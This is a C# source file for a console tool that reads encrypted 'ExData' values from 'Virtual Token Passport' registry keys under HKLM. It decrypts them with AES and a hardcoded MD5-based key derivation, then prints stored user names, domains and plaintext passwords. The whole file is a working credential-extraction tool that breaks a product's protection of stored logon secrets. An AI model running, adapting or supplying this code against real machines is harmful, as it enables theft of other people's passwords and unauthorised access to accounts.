using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Security.Cryptography;
using System.Text;

namespace FingerprintEncryption
{
  class Startup
  {
    private static bool _verbose = false;

    //NOTE: This only seems to decrypt "ExData", not the other one, which is okay I guess since it has more data.
    //      It's structured in such a way that hopefully it'll work for other key lengths besides just 56.
    //      It currently tries to decrypt any "ExData" values in either 32-bit or 64-bit registries and displays the Unicode strings within.
    //      I haven't figured out the format of the data yet -- not easy to traverse at first glance.
    //Forgive the awfulness that is this code file.
    static void Main(string[] args)
    {
      //Display basic stuff
      var asm = System.Reflection.Assembly.GetExecutingAssembly().GetName();
      Console.WriteLine(asm.Name + " v" + asm.Version.ToString(3));
      Console.WriteLine("This application attempts to extract your logon information");
      Console.WriteLine(" from one or more encrypted registry keys.");

      //Parse command line arguments
      foreach (var arg in args)
      {
        var a = arg.TrimEnd(new char[] { '-', '/' });
        if (a.Contains("v"))
          _verbose = true;
        else if (a.Contains("h"))
        {
          //Display help
          Console.WriteLine("Options:");
          Console.WriteLine("-v\tVerbose mode; display all strings from registry key.");
          Console.WriteLine("-h\tDisplay this help text.");
          Console.WriteLine();

          return;
        }
      }

      //Get busy...
      Console.WriteLine();
      Console.WriteLine("Working...");

      //Check all the registry keys we know of...
      _ScanRegistryKey(@"Software\Virtual Token\Passport\2.0\Passport");
      _ScanRegistryKey(@"Software\Virtual Token\Passport\2.0\LocalPassport");
      _ScanRegistryKey(@"Software\Virtual Token\Passport\2.0\DevicePassport");
      _ScanRegistryKey(@"Software\Virtual Token\Passport\2.0\VoidPassport");
      _ScanRegistryKey(@"Software\Virtual Token\Passport\4.0\Passport");
      _ScanRegistryKey(@"Software\Virtual Token\Passport\4.0\LocalPassport");
      _ScanRegistryKey(@"Software\Virtual Token\Passport\4.0\DevicePassport");
      _ScanRegistryKey(@"Software\Virtual Token\Passport\4.0\VoidPassport");
    }

    private static void _ScanRegistryKey(string subKey)
    {
      //Deal with 32-bit version
      var reg32 = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry32);
      var key32 = reg32.OpenSubKey(subKey);
      if (key32 != null)
      {
        //Fetch all the 32-bit keys
        foreach (var name in key32.GetSubKeyNames())
        {
          var r = key32.OpenSubKey(name);
          foreach (var val in r.GetValueNames())
          {
            //Handle this key value
            _HandleKeyValue(r.Name, val, (byte[])r.GetValue(val));
          }
        }
      }

      //Deal with 64-bit version
      var reg64 = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64);
      var key64 = reg64.OpenSubKey(subKey);
      if (key64 != null)
      {
        //Fetch all the 64-bit keys
        foreach (var name in key64.GetSubKeyNames())
        {
          var r = key64.OpenSubKey(name);
          foreach (var val in r.GetValueNames())
          {
            //Handle this key value
            _HandleKeyValue(r.Name, val, (byte[])r.GetValue(val));
          }
        }
      }
    }

    private static void _HandleKeyValue(string key, string name, byte[] raw)
    {
      //HACK: Since this currently only supports ExData, only look for it...
      if (name == "ExData")
      {
        //Display initial information
        Console.WriteLine(String.Format("Found {0}, name {1}:", key, name));

        //Extract the relevant pieces of information
        int header = _GetInt(raw, 0);
        int type = _GetInt(raw, 4);
        int bitLength = _GetInt(raw, 16);
        var data = new byte[_GetInt(raw, 20)];
        Array.Copy(raw, 24, data, 0, data.Length);
        var iv = new byte[_GetInt(raw, 24 + data.Length)];
        Array.Copy(raw, 24 + data.Length + 4, iv, 0, iv.Length);
        if (_verbose)
        {
          Console.WriteLine(String.Format("\tHeader: {0}", header.ToString("X4")));
          Console.WriteLine(String.Format("\tType: {0}", type.ToString("X4")));
          Console.WriteLine(String.Format("\tBit length: {0}", bitLength.ToString()));
          Console.WriteLine(String.Format("\tIV length: {0}", iv.Length.ToString("X4")));
          Console.WriteLine(String.Format("\tDecrypting {0} data bytes...", data.Length.ToString("X4")));
        }

        var output = _DecryptData(data, iv, bitLength, null);
        if (output[8] == 'P' && output[9] == 'S' && output[10] == '1')
        {
          if (_verbose) Console.WriteLine("\tDecryption successful!");

          //HACK: Really dumb parsing of the string data since I can't seem to figure it out yet...
          //Look for B0 04 00 00, and if found, look at the previous int for the size and rip it out
          int i = 11;
          if (_verbose) Console.WriteLine("\tStrings:");
          var lastString = String.Empty;
          while (i < output.Length)
          {
            if (output[i] == 0xB0 && output[i + 1] == 0x04 && output[i + 2] == 0x00 && output[i + 3] == 0x00)
            {
              //Get the size
              int size = _GetInt(output, i - 4);
              
              //Rip out the data
              var str = System.Text.UnicodeEncoding.Unicode.GetString(output, i + 4, size).TrimEnd('\0');

              //Display it
              if (_verbose)
              {
                Console.WriteLine("\t\t" + str);
              }
              else
              {
                switch (lastString.ToLower())
                {
                  case "0x11":
                    {
                      Console.WriteLine("\t\tUser name:\t" + str);
                      break;
                    }
                  case "0x12":
                    {
                      if (str.ToLower() != "p1" && str.ToLower() != "0x11" && str.ToLower() != "0x12")
                        Console.WriteLine("\t\tDomain:\t" + str);
                      break;
                    }
                  case "p1":
                    {
                      Console.WriteLine("\t\tPassword:\t" + str);
                      break;
                    }
                  default:
                    {
                      //Uh? Oh well...
                      break;
                    }
                }
              }

              //Save it for next iteration
              lastString = str;
            }

            i++;
          }
        }
        else
        {
          if (_verbose) Console.WriteLine("\tDecryption error!");
        }
      }
    }

    private static int _GetInt(byte[] raw, int offset)
    {
      return (raw[offset] | (raw[offset + 1] << 8) | (raw[offset + 2] << 16) | (raw[offset + 3] << 24));
    }

    private static byte[] _DecryptData(byte[] data, byte[] IV, int bitLength, byte[] passphrase)
    {
      var aes = new System.Security.Cryptography.AesCryptoServiceProvider();
      var iv = new byte[16]; //always 16 for AES
      var key = new byte[IV.Length == 7 ? 32 : IV.Length / 8]; //HACK: for "AES-56", convert to AES-256
      var ret = new byte[data.Length];

      //Pad the IV if necessary
      Array.Copy(IV, iv, IV.Length);

      //Derive the key
      var derived = _DeriveEncryptionKey(bitLength, passphrase);
      Array.Copy(derived, key, derived.Length);

      //Decrypt it!
      aes.CreateDecryptor(key, iv).TransformBlock(data, 0, data.Length, ret, 0);

      return ret;
    }

    private static byte[] _DeriveEncryptionKey(int bitLength, byte[] passphrase)
    {
      //Key derivation logic:
      //  Constant array is concatenated with passphrase and MD5 hashed.
      //  For a certain number of iterations:
      //    The passphrase is concatenated with the previous hash, MD5 hashed, and then used as the new hash.
      //  The number of bytes required for the requested key is calculated.
      //  For each byte of the key:
      //    Calculate the MD5 hash of the previous hash.
      //    Use the 12th byte as part of the key.
      const int ITERATIONS = 1000;
      byte[] start = { 0xEA, 0x59, 0x40, 0xC3, 0xB9, 0x41, 0x9C, 0xD2, 0xEB, 0x72, 0x96, 0xEF, 0x70, 0xD9, 0xAA, 0x2F };
      var md5 = new MD5CryptoServiceProvider();
      byte[] hash = md5.ComputeHash(_Merge(start, passphrase));

      for (int i = 0; i < ITERATIONS; i++)
        hash = md5.ComputeHash(_Merge(passphrase, hash));
      var key = new byte[(bitLength + 7) / 8];
      for (int i = 0; i < key.Length; i++)
      {
        hash = md5.ComputeHash(hash);
        key[i] = hash[11];
      }

      return key;
    }

    //Just merges two arrays. You can pass NULL for either (or both?).
    private static byte[] _Merge(byte[] first, byte[] second)
    {
      var ret = new byte[(first != null ? first.Length : 0) + (second != null ? second.Length : 0)];

      if (first != null)
        Array.Copy(first, ret, first.Length);
      if (second != null)
        Array.Copy(second, 0, ret, (first != null ? first.Length : 0), second.Length);

      return ret;
    }
  }
}
